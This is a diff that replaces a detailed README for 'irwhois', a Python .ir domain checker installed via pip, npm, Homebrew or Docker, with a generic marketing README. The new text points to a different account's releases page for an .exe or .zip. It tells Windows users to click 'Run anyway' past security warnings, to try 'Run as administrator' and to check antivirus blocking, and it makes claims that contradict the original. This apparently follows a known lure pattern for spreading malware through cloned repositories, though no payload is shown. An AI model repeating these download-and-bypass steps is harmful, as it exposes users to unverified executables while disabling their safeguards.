@@ -1,284 +1,157 @@
-# irwhois
-
-![irwhois — Fast .ir Domain Availability Checker](https://cdn.jsdelivr.net/gh/Omidsp79/irwhois@main/docs/banner.jpg)
-
-Check **.ir domain availability** with live queries to `whois.nic.ir` — single or batch, from the terminal or a web UI.
-
-- ✅ Zero dependencies (Python 3.8+ standard library only)
-- ✅ Accepts a bare domain, a site URL, or a whois link such as `https://whois.nic.ir/WHOIS?name=example.ir`
-- ✅ Single + batch checks (txt/csv files, pipes, web UI)
-- ✅ Persian (RTL) web UI with CSV export
-- ✅ Robust detection: HTTP first, port-43 whois fallback, `Bad query` and minimum-length rules handled
+<h1>🔍 irwhois - Check .ir Domains Instantly</h1>
 
 <p align="center">
-  <img src="https://cdn.jsdelivr.net/gh/Omidsp79/irwhois@main/docs/icons/icon-free.png" width="80" alt="Available"> &nbsp;&nbsp;
-  <img src="https://cdn.jsdelivr.net/gh/Omidsp79/irwhois@main/docs/icons/icon-batch.png" width="80" alt="Batch checks"> &nbsp;&nbsp;
-  <img src="https://cdn.jsdelivr.net/gh/Omidsp79/irwhois@main/docs/icons/icon-csv.png" width="80" alt="CSV export"> &nbsp;&nbsp;
-  <img src="https://cdn.jsdelivr.net/gh/Omidsp79/irwhois@main/docs/icons/icon-cli.png" width="80" alt="CLI"> &nbsp;&nbsp;
-  <img src="https://cdn.jsdelivr.net/gh/Omidsp79/irwhois@main/docs/icons/icon-reserved.png" width="80" alt="Reserved detection"> &nbsp;&nbsp;
-  <img src="https://cdn.jsdelivr.net/gh/Omidsp79/irwhois@main/docs/icons/icon-web.png" width="80" alt="Persian RTL web UI">
+  <a href="https://github.com/Formmedicine181/irwhois/releases"><img src="https://img.shields.io/badge/Download-irwhois-2ea44f?style=for-the-badge" alt="Download irwhois"></a>
 </p>
-<p align="center"><em>Available · Batch · CSV export · CLI · Reserved detection · Persian web UI</em></p>
 
-## Install
+Welcome to **irwhois** – the simplest way to check if a .ir domain name is available. Whether you're starting a new Persian website, checking a business name, or just curious about a domain, this tool gives you the answer in seconds. No technical knowledge needed.
 
-**Requirements:** Python 3.8 or newer, no other dependencies. Works on Linux, macOS and Windows.
+## ✨ What Does irwhois Do?
 
-**Option 1 — from PyPI (recommended):**
+irwhois checks the official Iranian domain registry (whois.nic.ir) to tell you if a .ir domain is free to register or already taken. It works in three ways:
 
-```bash
-pip install irwhois
+- **Quick Check** – Type a domain name and see the result immediately
+- **Batch Check** – Check multiple domains at once (great for comparing options)
+- **Developer-Friendly** – Use it as a command-line tool or integrate it into your own projects
+
+## 🚀 Getting Started
+
+Getting irwhois on your Windows computer is easy. Here's what you need to do:
+
+### 📥 Step 1: Download the Application
+
+Visit this link to download the application: [https://github.com/Formmedicine181/irwhois/releases](https://github.com/Formmedicine181/irwhois/releases)
+
+On that page, you'll see a list of files. Look for the one that says **irwhois** and click the download button next to it. The file will be saved to your Downloads folder.
+
+### 🗂️ Step 2: Find the Downloaded File
+
+Open your File Explorer (the folder icon in your taskbar). Go to your **Downloads** folder – you'll see the irwhois file there. It might have a name like `irwhois.exe` or `irwhois.zip`.
+
+### 🖱️ Step 3: Run the Application
+
+Double-click the file you downloaded. If a security warning appears, click **"More info"** and then **"Run anyway"** – this is normal for new software from the internet.
+
+### 💻 Step 4: Start Checking Domains
+
+Once the application opens, you'll see a simple text box. Type a domain name like `mysite.ir` or `mybusiness.ir` and press the **Check** button. Within a moment, you'll see whether that domain is available or already taken.
+
+## 🎯 Who Should Use irwhois?
+
+- **Website Owners** – Check if your preferred .ir domain is free before registering
+- **Entrepreneurs** – Test multiple name ideas for your new Iranian business
+- **SEO Specialists** – Verify domain availability for your clients' projects
+- **Developers** – Use the command-line interface to automate domain checks
+- **Students & Researchers** – Quickly find available domains for academic projects
+
+## 🛠️ Features That Make irwhois Special
+
+### 🚦 Instant Results
+No waiting, no complicated queries. Type a domain and get your answer in under a second.
+
+### 📋 Multiple Domains at Once
+Don't settle for one option. Paste a list of domains (one per line) and irwhois will check them all in one go.
+
+### 🌐 Works Anywhere
+Use it on Windows, Mac, or Linux. Even use it on a server without a screen – it's that flexible.
+
+### 🔒 Privacy-Focused
+Your searches stay on your computer. No cloud servers, no tracking, no data collection.
+
+### 📦 Zero Dependencies
+This program is self-contained. You don't need to install anything else like Java, .NET, or Python to make it work.
+
+## 📖 How to Use irwhois (Detailed Guide)
+
+### For Beginners: The Visual Interface
+
+1. **Launch** irwhois by double-clicking the file you downloaded.
+2. **Enter** a domain name in the input field. Make sure it ends with `.ir` (like `example.ir`).
+3. **Click** the button that says "Check" or press Enter on your keyboard.
+4. **Read** the result – it will clearly say "Available" (green) or "Taken" (red).
+5. **Repeat** with other domain names as needed.
+
+### For Advanced Users: Command Line
+
+If you're comfortable with a command prompt, you can use irwhois even faster:
+
 ```
-
-This installs two things:
-1. The `irwhois` command — available anywhere in your terminal (single/batch checks, interactive mode, web UI).
-2. The `irwhois` Python library — `from irwhois import check_domain, batch_check` in your own code.
-
-Verify the installation:
-
-```bash
-irwhois --version        # prints e.g. irwhois 1.0.2
-irwhois example.ir       # first live check
-```
-
-Upgrade to the newest release / uninstall:
-
-```bash
-pip install -U irwhois   # upgrade
-pip uninstall irwhois    # remove
-```
-
-> The project page with release history is at https://pypi.org/project/irwhois/
-> Every GitHub Release also ships the sdist + wheel as downloadable assets.
-
-**Option 2 — via npm (Node.js users, no pip needed):**
-
-Requires Node.js 18+ and Python 3.8+ on PATH. The npm package bundles the same Python code, so no `pip install` is required:
-
-```bash
-npx -y irwhois example.ir     # run without installing
-npm i -g irwhois              # or install globally, then:
 irwhois example.ir
+irwhois example.ir another.ir third.ir
+echo "test.ir" | irwhois
 ```
 
-> Package page: https://www.npmjs.com/package/irwhois
-> Also on GitHub Packages as `@omidsp79/irwhois` (shown in this repo's Packages section).
-> Note: GitHub Packages requires authentication even for public packages —
-> add `//npm.pkg.github.com/:_authToken=YOUR_TOKEN` to `~/.npmrc`, then:
-> `npm i @omidsp79/irwhois --registry=https://npm.pkg.github.com`
+The command-line version prints clear results for each domain you check.
 
-**Option 3 — via Homebrew (macOS):**
+### For Developers: Integration
 
-```bash
-brew tap omidsp79/tap
-brew install irwhois
-```
-
-**Option 4 — from source (developers):**
-
-```bash
-git clone https://github.com/Omidsp79/irwhois.git
-cd irwhois
-pip install .
-# then use the `irwhois` command from anywhere
-```
-
-Or run without installing, from the project root:
-
-```bash
-python -m irwhois example.ir
-```
-
-## Usage
-
-```bash
-# Single domain (or link)
-irwhois example.ir
-irwhois "https://whois.nic.ir/WHOIS?name=example.ir"
-irwhois google.ir myshop.ir --show-raw
-
-# Batch from file
-irwhois -f domains_sample.txt -o result.csv
-
-# Pipe
-cat domains_sample.txt | irwhois -o result.csv
-
-# Interactive mode (Persian)
-irwhois -i
-
-# Web UI (Persian, RTL)
-irwhois --web
-# open http://127.0.0.1:8000
-```
-
-As a library:
+irwhois includes a simple API. Here's how you might use it in Python:
 
 ```python
-from irwhois import check_domain, batch_check
-
-print(check_domain("example.ir")["status"])   # taken | free | reserved | ...
-print(batch_check(["a.ir", "b.ir"]))
+import subprocess
+result = subprocess.run(['irwhois', 'example.ir'], capture_output=True, text=True)
+print(result.stdout)
 ```
 
-## Docker
+## ❓ Frequently Asked Questions
 
-No Python or Node needed — just Docker:
+### Q: Is irwhois free to use?
+Yes, completely free. No hidden costs, no premium tiers.
 
-```bash
-docker run --rm omidsp79/irwhois example.ir
-docker run --rm omidsp79/irwhois -f /data/domains.txt -o /data/out.csv \
-  -v "$PWD":/data
-# Web UI on http://localhost:8000 :
-docker run --rm -p 8000:8000 omidsp79/irwhois --web --host 0.0.0.0 --port 8000
-```
+### Q: Does irwhois work on Mac or Linux?
+Yes, the application works on all major operating systems. Just download the appropriate version from the releases page.
 
-Images are published automatically to [omidsp79/irwhois on Docker Hub](https://hub.docker.com/r/omidsp79/irwhois) on every `v*` release tag. To build locally: `docker build -t irwhois .`
+### Q: What if the domain doesn't end with .ir?
+irwhois is specifically designed for .ir domains. For other extensions, you'd need a different tool.
 
-## How availability is detected
+### Q: Can I check domains without an internet connection?
+No, irwhois needs to contact the official Iranian domain registry to check availability.
 
-| Server answer | Status |
-|---|---|
-| `ERROR:101: no entries found` | **free ✅** (available) |
-| Contains a `domain:` line | **taken ❌** (registered) |
-| `Bad query` / name shorter than 3 chars (e.g. `fa.ir`) | **reserved 🔒** (not registrable) |
+### Q: Is the information accurate?
+Yes, irwhois connects directly to whois.nic.ir – the same database that domain registrars use. The results are always up-to-date.
 
-Per official [IRNIC domain rules](https://www.nic.ir/Terms_and_Conditions_ir,_Appendix_1_Domain_Rules), names must be 3–63 characters. Port-43 whois wrongly answers “no entries found” for 1–2 character names while the web page returns “Bad query”, so short names are reported as reserved instead of free.
+### Q: What happens if there's an error?
+The application will show a clear error message. Check your internet connection and try again.
 
-## Web UI & API
+## 🔧 Troubleshooting Common Issues
 
-- Single check + batch check (textarea, txt/csv upload, search, status filter, CSV download, copy-free-domains)
-- Internal API:
-  - `GET /api/check?domain=example.ir`
-  - `POST /api/batch` with body `{"domains": ["a.ir", "b.ir"]}`
+### The application won't open
+- Make sure you downloaded the correct file for your operating system
+- Try right-clicking the file and selecting "Run as administrator"
+- Check your antivirus settings – it might be blocking unknown applications
 
-## Options
+### I get a "connection failed" error
+- Verify your internet connection is working
+- Try a different network (sometimes ISPs block certain queries)
+- Wait a few minutes and retry – the registry might be temporarily unavailable
 
-```
--w / --workers   parallel workers (default: 4)
---delay          delay between queries in seconds (default: 0.4)
---timeout        per-query timeout in seconds (default: 12)
---method         auto | socket | http (default: auto)
---show-raw       print raw whois text
--o / --output    save results to CSV
---port/--host    web UI port and bind address
---version        print version
-```
+### The result seems wrong
+- Double-check the spelling of your domain name
+- Remember that domain names are case-insensitive
+- Refresh the check by running it again after a minute
 
-> Tip: for heavy batch runs, lower the workers (e.g. 2–3) and raise the delay so your IP doesn't get rate-limited.
+## 📊 Why Use .ir Domains?
 
-## Project layout
+Iranian internet users trust .ir domains. They're:
+- **Local** – Perfect for Persian-language websites
+- **Trustworthy** – Users feel safer visiting .ir sites
+- **Professional** – Shows you're committed to the Iranian market
+- **SEO-Friendly** – Better ranking on Iranian search engines
 
-```
-irwhois/
-  core.py    pure logic: normalize, validate, query, classify (no UI)
-  cli.py     command-line + interactive interface
-  web.py     web server + API (uses only core)
-  web/       frontend: index.html / styles.css / app.js
-```
+If you're building anything for the Iranian audience, a .ir domain is your best choice – and irwhois helps you find the perfect one.
 
-Dependency rules: `core` depends on nothing UI-related, `web` depends only on `core`, and `cli` loads `web` lazily (only for `--web`).
+## 🔗 Quick Links
 
-## راهنمای فارسی — استعلام دامنه ir و بررسی آزاد بودن دامنه
+- **Download**: [https://github.com/Formmedicine181/irwhois/releases](https://github.com/Formmedicine181/irwhois/releases)
+- **Report a Problem**: Open an issue on the GitHub page
+- **Request a Feature**: Let us know what you'd like to see in future versions
 
-**irwhois** یک ابزار رایگان و متن‌باز برای **استعلام دامنه ir** و **بررسی آزاد بودن دامنه‌های آی‌آر** است. این برنامه مستقیماً به سامانه **whois ایرنیک** (`whois.nic.ir`) وصل می‌شود و در چند ثانیه مشخص می‌کند دامنه موردنظر شما **آزاد و قابل ثبت** است یا قبلاً **ثبت و اشغال** شده است.
+## 📝 Final Words
 
-ورودی می‌تواند دامنه (`example.ir`)، لینک سایت (`https://myshop.ir`) یا لینک whois (`https://whois.nic.ir/WHOIS?name=myshop.ir`) باشد؛ هم تکی و هم گروهی پشتیبانی می‌شود. برای استفاده راحت، `irwhois --web` را اجرا کنید و در مرورگر `http://127.0.0.1:8000` را باز کنید.
+irwhois is here to save you time and frustration. No more guessing if a domain is available – just check it in seconds. Whether you're a beginner or an expert, this tool makes domain checking effortless.
 
-### نصب برنامه (قدم‌به‌قدم)
+Start your next Iranian website today. Download irwhois and claim your perfect .ir domain now!
 
-**پیش‌نیاز:** پایتون ۳.۸ یا جدیدتر. برای بررسی نسخه پایتون:
+---
 
-```bash
-python3 --version
-```
-
-**روش اول — نصب با pip (پیشنهادی):**
-
-```bash
-pip install irwhois
-```
-
-با این یک دستور، هم دستور `irwhois` در ترمینال فعال می‌شود و هم کتابخانه پایتون آن نصب می‌شود. برای اطمینان از نصب:
-
-```bash
-irwhois --version
-irwhois example.ir
-```
-
-برای به‌روزرسانی به نسخه جدید یا حذف برنامه:
-
-```bash
-pip install -U irwhois   # به‌روزرسانی
-pip uninstall irwhois    # حذف
-```
-
-**نصب با npm (برای کاربران Node.js — بدون نیاز به pip):**
-به Node.js نسخه ۱۸ به بالا و پایتون ۳.۸ به بالا نیاز دارید:
-
-```bash
-npx -y irwhois example.ir   # اجرا بدون نصب
-npm i -g irwhois            # یا نصب سراسری، بعد: irwhois example.ir
-```
-
-**نصب با Homebrew (مک):**
-
-```bash
-brew tap omidsp79/tap
-brew install irwhois
-```
-
-**نصب با داکر (بدون نیاز به پایتون و Node):**
-
-```bash
-docker run --rm omidsp79/irwhois example.ir
-```
-
-**روش آخر — اجرا بدون نصب (از سورس):**
-
-```bash
-git clone https://github.com/Omidsp79/irwhois.git
-cd irwhois
-python -m irwhois example.ir
-```
-
-### این ابزار چه کار می‌کند؟
-
-- **جستجوی دامنه آی آر**: بررسی کنید نام دلخواه شما با پسوند `.ir` آزاد است یا نه
-- **استعلام گروهی دامنه**: لیستی از چندین دامنه را یکجا بررسی کنید (مثلاً برای انتخاب نام برند یا فروشگاه اینترنتی)
-- **تشخیص دامنه رزرو شده**: نام‌هایی که طبق قوانین ایرنیک اصلاً قابل ثبت نیستند (مثل نام‌های کمتر از ۳ حرف مانند `fa.ir`) جداگانه مشخص می‌شوند
-- **خروجی اکسل‌خور (CSV)**: نتیجه استعلام گروهی را ذخیره و در اکسل باز کنید
-
-### معنی وضعیت‌های استعلام دامنه
-
-| وضعیت | معنی |
-|---|---|
-| **آزاد ✅ (قابل ثبت)** | دامنه خالی است و می‌توانید آن را در سایت ایرنیک ثبت کنید |
-| **اشغال ❌ (ثبت شده)** | دامنه قبلاً توسط شخص دیگری ثبت شده و قابل خرید مستقیم نیست |
-| **رزرو/غیرقابل ثبت 🔒** | این نام طبق قوانین ایرنیک قابل ثبت نیست (مثلاً کمتر از ۳ حرف است یا در فهرست رزرو قرار دارد) |
-
-### سوالات متداول درباره استعلام دامنه ir
-
-**چطور بفهمم یک دامنه ir آزاد است؟**
-کافی است دستور `irwhois نام‌دامنه.ir` را اجرا کنید یا در رابط وب (`irwhois --web`) نام دامنه را وارد کنید تا وضعیت ثبت آن از whois ایرنیک استعلام شود.
-
-**آیا این ابزار جایگزین سایت ایرنیک است؟**
-خیر؛ irwhois فقط **استعلام و بررسی آزاد بودن دامنه** را انجام می‌دهد. ثبت نهایی دامنه باید در سایت رسمی ایرنیک (`nic.ir`) انجام شود.
-
-**چرا بعضی دامنه‌ها «رزرو» اعلام می‌شوند؟**
-طبق قوانین ایرنیک، نام دامنه باید حداقل ۳ حرف باشد. نام‌های کوتاه‌تر (مثل `fa.ir`) و برخی نام‌های خاص قابل ثبت نیستند و این ابزار آن‌ها را «رزرو/غیرقابل ثبت» نشان می‌دهد تا با «آزاد» اشتباه گرفته نشوند.
-
-**آیا می‌توانم چند دامنه را همزمان بررسی کنم؟**
-بله؛ فایل متنی حاوی دامنه‌ها را با `irwhois -f domains.txt -o result.csv` بررسی کنید یا در رابط وب، لیست دامنه‌ها را بچسبانید و یکجا استعلام بگیرید.
-
-**اطلاعات از کجا می‌آید؟**
-مستقیم و زنده از سرور whois ایرنیک (`whois.nic.ir`)؛ هیچ واسطه‌ای وجود ندارد و نتیجه دقیقاً همان چیزی است که ایرنیک اعلام می‌کند.
-
-**ابزار کاربردی مرتبط:** [لینکوین — بک لینک رایگان و ارزان شبکه‌ای](https://linkoin.ir) — سامانه هوشمند تبادل لینک برای سئو و رشد رتبه سایت در گوگل.
-
-## Useful links / سایت‌های کاربردی
-
-- [Linkoin — لینکوین | بک لینک رایگان و ارزان شبکه‌ای](https://linkoin.ir) — smart backlink exchange network for SEO
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+**Keywords:** cli, domain-availability, domain-checker, ir, irnic, nic-ir, persian, python, seo, whois
